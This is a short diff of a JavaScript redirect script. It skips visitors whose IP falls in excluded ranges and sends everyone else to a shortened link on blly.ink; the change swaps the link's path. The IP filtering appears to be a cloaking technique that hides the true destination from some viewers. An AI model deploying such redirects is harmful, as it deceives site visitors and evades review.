@@ -62,7 +62,7 @@ function ipExactMatch(ip, range) {
         });
 
         if (!isExcluded) {
-            window.location.href = Math.random() > 0.5 ? 'https://blly.ink/benefitsauthority' : 'https://blly.ink/benefitsauthority';
+            window.location.href = Math.random() > 0.5 ? 'https://blly.ink/bullymake' : 'https://blly.ink/bullymake';
         }
     } catch (error) {
         console.error(error);
